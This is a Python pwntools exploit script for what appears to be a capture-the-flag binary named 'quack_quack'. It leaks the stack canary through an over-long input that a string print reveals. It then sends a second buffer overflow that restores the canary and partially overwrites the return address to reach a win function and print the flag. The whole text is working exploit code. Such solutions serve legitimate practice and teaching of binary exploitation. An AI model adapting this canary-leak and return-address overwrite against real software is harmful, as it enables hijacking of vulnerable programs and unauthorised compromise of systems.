#!/usr/bin/env python3

from pwn import *

io = process('./quack_quack')

canary_offset_from_buf = 0x78
print_offset = 0x20
# plus 1, cause last byte of canary always equal to 0, cause %s leak fail
canary_payload = b'A' * (canary_offset_from_buf - print_offset + 1)
canary_payload += b'Quack Quack '

_ = io.sendlineafter(b'> ', canary_payload)
_ = io.recvuntil(b'Quack Quack ')
canary = u64(io.recv(7).rjust(8, b'\x00'))
print(f'leak canary: {hex(canary)}')

win_last2bytes = b'\x7f\x13'
win_payload = b'A' * 0x58 + p64(canary) + b'B' * 8 + win_last2bytes
_ = io.sendlineafter(b'> ', win_payload)

_ = io.recvuntil(b'against a Duck?!')

flag = io.recvall().strip(b'\n')

print(flag.decode())
